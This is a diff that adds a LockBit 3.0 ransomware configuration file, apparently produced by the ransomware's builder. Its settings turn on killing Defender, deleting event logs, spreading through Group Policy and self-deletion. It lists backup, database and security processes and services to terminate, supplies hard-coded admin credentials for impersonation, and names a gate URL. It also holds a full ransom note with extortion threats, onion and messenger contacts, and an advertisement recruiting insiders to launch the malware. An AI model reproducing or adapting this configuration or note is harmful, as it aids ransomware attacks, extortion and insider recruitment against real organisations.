@@ -1,0 +1,156 @@
+{
+  "bot": {
+    "uid": "00000000000000000000000000000000",
+    "key": "00000000000000000000000000000000"
+  },
+"config": {
+    "settings": {
+      "encrypt_mode": "auto",
+      "encrypt_filename": false,
+      "impersonation": true,
+      "skip_hidden_folders": false,
+      "language_check": false,
+      "local_disks": true,
+      "network_shares": true,
+      "kill_processes": true,
+      "kill_services": true,
+      "running_one": true,
+      "print_note": true,
+      "set_wallpaper": true,
+      "set_icons": true,
+      "send_report": false,
+      "self_destruct": true,
+      "kill_defender": true,
+      "wipe_freespace": false,
+      "psexec_netspread": false,
+      "gpo_netspread": true,
+      "gpo_ps_update": true,
+      "shutdown_system": false,
+      "delete_eventlogs": true,
+      "delete_gpo_delay": 1
+    },
+    "white_folders": "$recycle.bin;config.msi;$windows.~bt;$windows.~ws;windows;boot;program files;program files (x86);programdata;system volume information;tor browser;windows.old;intel;msocache;perflogs;x64dbg;public;all users;default;microsoft",
+    "white_files": "autorun.inf;boot.ini;bootfont.bin;bootsect.bak;desktop.ini;iconcache.db;ntldr;ntuser.dat;ntuser.dat.log;ntuser.ini;thumbs.db;GDIPFONTCACHEV1.DAT;d3d9caps.dat",
+    "white_extens": "386;adv;ani;bat;bin;cab;cmd;com;cpl;cur;deskthemepack;diagcab;diagcfg;diagpkg;dll;drv;exe;hlp;icl;icns;ico;ics;idx;ldf;lnk;mod;mpa;msc;msp;msstyles;msu;nls;nomedia;ocx;prf;ps1;rom;rtp;scr;shs;spl;sys;theme;themepack;wpx;lock;key;hta;msi;pdb;search-ms",
+    "white_hosts": "WS2019",
+    "kill_processes": "sql;oracle;ocssd;dbsnmp;synctime;agntsvc;isqlplussvc;xfssvccon;mydesktopservice;ocautoupds;encsvc;firefox;tbirdconfig;mydesktopqos;ocomm;dbeng50;sqbcoreservice;excel;infopath;msaccess;mspub;onenote;outlook;powerpnt;steam;thebat;thunderbird;visio;winword;wordpad;notepad;calc;wuauclt;onedrive",
+    "kill_services": "vss;sql;svc$;memtas;mepocs;msexchange;sophos;veeam;backup;GxVss;GxBlr;GxFWD;GxCVD;GxCIMgr",
+    "gate_urls": "https://test.white-datasheet.com/;http://test.white-datasheet.com/",
+    "impers_accounts": "ad.lab:Qwerty!;Administrator:123QWEqwe!@#;Admin2:P@ssw0rd;Administrator:P@ssw0rd;Administrator:Qwerty!;Administrator:123QWEqwe;Administrator:123QWEqweqwe",
+    "note": "
+            ~~~ LockBit 3.0 the world's fastest ransomware since 2019~~~
+
+>>>> Your data are stolen and encrypted
+
+	The data will be published on TOR website if you do not pay the ransom 
+
+	Links for Tor Browser:
+	http://lockbitapt2yfbt7lchxejug47kmqvqqxvvjpqkmevv4l3azl3gy6pyd.onion
+	http://lockbitapt5x4zkjbcqmz6frdhecqqgadevyiwqxukksspnlidyvd7qd.onion
+	http://lockbitapt6vx57t3eeqjofwgcglmutr3a35nygvokja5uuccip4ykyd.onion
+	http://lockbitapt34kvrip6xojylohhxrwsvpzdffgs5z4pbbsywnzsbdguqd.onion
+	http://lockbitaptc2iq4atewz2ise62q63wfktyrl4qtwuk5qax262kgtzjqd.onion
+	http://lockbitaptjpikdqjynvgozhgc6bgetgucdk5xjacozeaawihmoio6yd.onion
+	http://lockbitaptq7ephv2oigdncfhtwhpqgwmqojnxqdyhprxxfpcllqdxad.onion
+	http://lockbitaptstzf3er2lz6ku3xuifafq2yh5lmiqj5ncur6rtlmkteiqd.onion
+	http://lockbitaptoofrpignlz6dt2wqqc5z3a4evjevoa3eqdfcntxad5lmyd.onion
+
+	Links for the normal browser
+	http://lockbitapt.uz
+	http://lockbitapt2yfbt7lchxejug47kmqvqqxvvjpqkmevv4l3azl3gy6pyd.onion.ly
+	http://lockbitapt5x4zkjbcqmz6frdhecqqgadevyiwqxukksspnlidyvd7qd.onion.ly
+	http://lockbitapt6vx57t3eeqjofwgcglmutr3a35nygvokja5uuccip4ykyd.onion.ly
+	http://lockbitapt34kvrip6xojylohhxrwsvpzdffgs5z4pbbsywnzsbdguqd.onion.ly
+	http://lockbitaptc2iq4atewz2ise62q63wfktyrl4qtwuk5qax262kgtzjqd.onion.ly
+	http://lockbitaptjpikdqjynvgozhgc6bgetgucdk5xjacozeaawihmoio6yd.onion.ly
+	http://lockbitaptq7ephv2oigdncfhtwhpqgwmqojnxqdyhprxxfpcllqdxad.onion.ly
+	http://lockbitaptstzf3er2lz6ku3xuifafq2yh5lmiqj5ncur6rtlmkteiqd.onion.ly
+	http://lockbitaptoofrpignlz6dt2wqqc5z3a4evjevoa3eqdfcntxad5lmyd.onion.ly
+
+
+>>>> What guarantees that we will not deceive you? 
+
+	We are not a politically motivated group and we do not need anything other than your money. 
+    
+	If you pay, we will provide you the programs for decryption and we will delete your data. 
+	Life is too short to be sad. Be not sad, money, it is only paper.
+    
+	If we do not give you decrypters, or we do not delete your data after payment, then nobody will pay us in the future. 
+	Therefore to us our reputation is very important. We attack the companies worldwide and there is no dissatisfied victim after payment.
+    
+	You can obtain information about us on twitter https://twitter.com/hashtag/lockbit?f=live
+    
+
+>>>> You need contact us and decrypt one file for free on these TOR sites with your personal DECRYPTION ID
+
+	Download and install TOR Browser https://www.torproject.org/
+	Write to a chat and wait for the answer, we will always answer you. 
+	Sometimes you will need to wait for our answer because we attack many companies.
+	
+	Links for Tor Browser:
+	http://lockbitsupt7nr3fa6e7xyb73lk6bw6rcneqhoyblniiabj4uwvzapqd.onion
+	http://lockbitsupuhswh4izvoucoxsbnotkmgq6durg7kficg6u33zfvq3oyd.onion
+	http://lockbitsupn2h6be2cnqpvncyhj4rgmnwn44633hnzzmtxdvjoqlp7yd.onion
+
+	Link for the normal browser
+	http://lockbitsupp.uz
+	
+	If you do not get an answer in the chat room for a long time, the site does not work and in any other emergency, you can contact us in jabber or tox.
+	
+	Tox ID LockBitSupp: 3085B89A0C515D2FB124D645906F5D3DA5CB97CEBEA975959AE4F95302A04E1D709C3C4AE9B7
+	XMPP (Jabber) Support: 598954663666452@exploit.im 365473292355268@thesecure.biz
+	
+>>>> Your personal DECRYPTION ID: B7568014A48684D6D525F3F3722638C4
+
+>>>> Warning! Do not DELETE or MODIFY any files, it can lead to recovery problems!
+
+>>>> Warning! If you do not pay the ransom we will attack your company repeatedly again!
+
+
+>>>> Advertisement
+	
+	Would you like to earn millions of dollars $$$ ?
+
+	Our company acquire access to networks of various companies, as well as insider information that can help you steal the most valuable data of any company. 
+	You can provide us accounting data for the access to any company, for example, login and password to RDP, VPN, corporate email, etc. 
+	Open our letter at your email. Launch the provided virus on any computer in your company.
+
+	You can do it both using your work computer or the computer of any other employee in order to divert suspicion of being in collusion with us.
+
+	Companies pay us the foreclosure for the decryption of files and prevention of data leak.
+
+	You can contact us using Tox messenger without registration and SMS https://tox.chat/download.html. 
+	Using Tox messenger, we will never know your real name, it means your privacy is guaranteed.
+
+	If you want to contact us, write in jabber or tox. 
+	
+	Tox ID LockBitSupp: 3085B89A0C515D2FB124D645906F5D3DA5CB97CEBEA975959AE4F95302A04E1D709C3C4AE9B7
+	XMPP (Jabber) Support: 598954663666452@exploit.im 365473292355268@thesecure.biz
+	
+	If this contact is expired, and we do not respond you, look for the relevant contact data on our website via Tor or Brave browser 
+	
+	Links for Tor Browser:
+	http://lockbitapt2yfbt7lchxejug47kmqvqqxvvjpqkmevv4l3azl3gy6pyd.onion
+	http://lockbitapt5x4zkjbcqmz6frdhecqqgadevyiwqxukksspnlidyvd7qd.onion
+	http://lockbitapt6vx57t3eeqjofwgcglmutr3a35nygvokja5uuccip4ykyd.onion
+	http://lockbitapt34kvrip6xojylohhxrwsvpzdffgs5z4pbbsywnzsbdguqd.onion
+	http://lockbitaptc2iq4atewz2ise62q63wfktyrl4qtwuk5qax262kgtzjqd.onion
+	http://lockbitaptjpikdqjynvgozhgc6bgetgucdk5xjacozeaawihmoio6yd.onion
+	http://lockbitaptq7ephv2oigdncfhtwhpqgwmqojnxqdyhprxxfpcllqdxad.onion
+	http://lockbitaptstzf3er2lz6ku3xuifafq2yh5lmiqj5ncur6rtlmkteiqd.onion
+	http://lockbitaptoofrpignlz6dt2wqqc5z3a4evjevoa3eqdfcntxad5lmyd.onion
+
+	
+	Links for the normal browser
+	http://lockbitapt.uz
+	http://lockbitapt2yfbt7lchxejug47kmqvqqxvvjpqkmevv4l3azl3gy6pyd.onion.ly
+	http://lockbitapt5x4zkjbcqmz6frdhecqqgadevyiwqxukksspnlidyvd7qd.onion.ly
+	http://lockbitapt6vx57t3eeqjofwgcglmutr3a35nygvokja5uuccip4ykyd.onion.ly
+	http://lockbitapt34kvrip6xojylohhxrwsvpzdffgs5z4pbbsywnzsbdguqd.onion.ly
+	http://lockbitaptc2iq4atewz2ise62q63wfktyrl4qtwuk5qax262kgtzjqd.onion.ly
+	http://lockbitaptjpikdqjynvgozhgc6bgetgucdk5xjacozeaawihmoio6yd.onion.ly
+	http://lockbitaptq7ephv2oigdncfhtwhpqgwmqojnxqdyhprxxfpcllqdxad.onion.ly
+	http://lockbitaptstzf3er2lz6ku3xuifafq2yh5lmiqj5ncur6rtlmkteiqd.onion.ly
+	http://lockbitaptoofrpignlz6dt2wqqc5z3a4evjevoa3eqdfcntxad5lmyd.onion.ly"
+  }
+}
